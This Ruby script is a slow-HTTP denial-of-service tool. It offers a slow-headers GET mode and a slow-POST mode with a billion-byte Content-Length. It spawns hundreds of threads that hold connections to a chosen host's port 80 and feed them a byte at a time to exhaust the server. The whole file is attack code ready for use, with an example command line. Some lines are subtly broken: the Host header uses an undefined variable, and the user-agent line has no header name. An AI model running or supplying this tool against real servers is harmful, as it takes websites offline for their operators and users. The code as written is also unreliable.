require 'socket'
require 'optparse'
require 'digest/md5'

# Ruby SlowHttpAttack
# Contains get based attack (slow headers) and post based attack (long content length)
#
# Author: Loqman Hakimi
#
# Example usage: ruby slow-http-attack.rb -m post -n 500 -h example.com -l 15 -t 900

# Setting default values 
options = {
	method: 'get',
	processes: 200,
	rate_limit: 10,
	keep_alive: 900
}
# Reading Options from command line arguments
banner = "Usage: ruby slow-http-attack.rb -h REMOTE_HOST [-m METHOD [-n NUMBER_OF_PROCESSES [-l RATE_LIMIT [-t KEEP_ALIVE]]]]"
OptionParser.new do |opts|
	opts.banner = banner
	opts.on('-m', '--method METHOD', 'Attack Method') { |v| options[:method] = v.downcase }
	opts.on('-n', '--processes-number NUMBER_OF_PROCESSES', 'Number of processes to run') { |v| options[:processes] = v.to_i }	
	opts.on('-h', '--host-name REMOTE_HOST', 'Remote host name') { |v| options[:r_host] =  v.downcase }	
	opts.on('-l', '--rate-limit RATE_LIMIT', 'Rate Limit time in seconds') { |v| options[:rate_limit] = v.to_i }
	opts.on('-t', '--keep-alive KEEP_ALIVE', 'HTTP Keep-Alive header') { |v| options[:keep_alive] = v.to_i }
end.parse!

# Checking for options
if options[:r_host].nil?
	puts banner 
	exit
end 

# Slow HTTP Attack with GET method
def slow_headers_get(host, rate_limit, keep_alive)
	request  = "GET / HTTP/1.1\r\n"
    request += "Host: #{$host}\r\n"
    request += "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\r\n"
    request += "Keep-Alive: #{keep_alive}\r\n"
    request += "Content-Length: " + (1 + rand(10000..1000000)).to_s + "\r\n"
    request += "Accept: *.*\r\n"
    request += "X-a: " + (1 + rand(1..10000)).to_s + "\r\n"
	TCPSocket.open(host, 80) do |socket|
		socket.write request
		loop {
			begin 			
				# Writing one character to socket
				socket.write "X-c: " + (1 + rand(1..10000)).to_s + "\r\n"	
				# Printing request indicator to console			
				print '.'
				# Suspending this thread for 1 second to rate limit data sent to target
				sleep rate_limit
			rescue
				break
			end
		}	
	end	
end

# Slow HTTP Attack with POST method
def long_slow_post(host, rate_limit, keep_alive) 
	request  = "POST /" + (Digest::MD5.hexdigest(srand.to_s)) + " HTTP/1.1\r\n";
    request += "Host: #{$host}\r\n"
    request += "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\r\n"
    request += "Keep-Alive: #{keep_alive}\r\n"
    request += "Content-Length: 1000000000\r\n";
    request += "Content-Type: application/x-www-form-urlencoded\r\n";
    request += "Accept: *.*\r\n";
    TCPSocket.open(host, 80) do |socket|
		socket.write request
		loop {
			begin 			
				# Writing one character to socket
				socket.write "."
				# Printing request indicator to console			
				print '.'
				# Suspending this thread for 1 second to rate limit data sent to target
				sleep rate_limit
			rescue
				break
			end
		}	
	end	
	socket.close
end 

puts 'Press Ctrl+C to exit'
# Creating threads based on user input
threads = []
loop {
	if threads.count < options[:processes]		
		threads << Thread.new {
			if options[:method] == 'get'
				slow_headers_get(options[:r_host], options[:rate_limit], options[:keep_alive])
			elsif options[:method] == 'post'
				long_slow_post(options[:r_host], options[:rate_limit], options[:keep_alive])
			end 
		}
	end	
	if threads.count == options[:processes]
		# Checking for dead threads and removing them from the list
		threads.each do |thread|
			threads.delete thread unless thread.alive?
		end
	end
}
